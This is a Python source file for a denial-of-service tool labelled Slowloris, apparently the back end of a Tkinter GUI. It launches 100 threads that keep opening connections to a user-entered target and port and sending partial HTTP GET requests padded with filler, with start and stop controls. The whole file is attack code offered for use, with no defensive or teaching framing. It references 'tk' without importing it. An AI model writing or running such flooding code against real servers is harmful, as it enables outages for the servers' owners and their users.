import socket
import threading

stop_event = threading.Event()

def perform_slowloris_attack(target, port, output_text_box):
    output_text_box.delete("1.0", tk.END)
    output_text_box.insert(tk.END, "Starting Slowloris attack...\n")
    output_text_box.update()

    def attack():
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send("GET /?{} HTTP/1.1\r\n".format("A" * 1000).encode("utf-8"))
                output_text_box.insert(tk.END, "Sent partial request...\n")
                output_text_box.update()
            except Exception as e:
                output_text_box.insert(tk.END, f"Error: {str(e)}\n")
                output_text_box.update()

    threads = [threading.Thread(target=attack) for _ in range(100)]
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

def start_ddos_attack(target_entry, port_entry, attack_type_var, output_text_box):
    target = target_entry.get()
    try:
        port = int(port_entry.get())
    except ValueError:
        output_text_box.insert(tk.END, "Error: Please enter a valid port number.\n")
        return

    if not target:
        output_text_box.insert(tk.END, "Error: Please enter a target address.\n")
        return

    attack_type = attack_type_var.get()
    stop_event.clear()

    if attack_type == "Slowloris":
        threading.Thread(target=perform_slowloris_attack, args=(target, port, output_text_box)).start()
    else:
        output_text_box.insert(tk.END, "Error: Unsupported attack type.\n")

def stop_ddos_attack():
    stop_event.set()
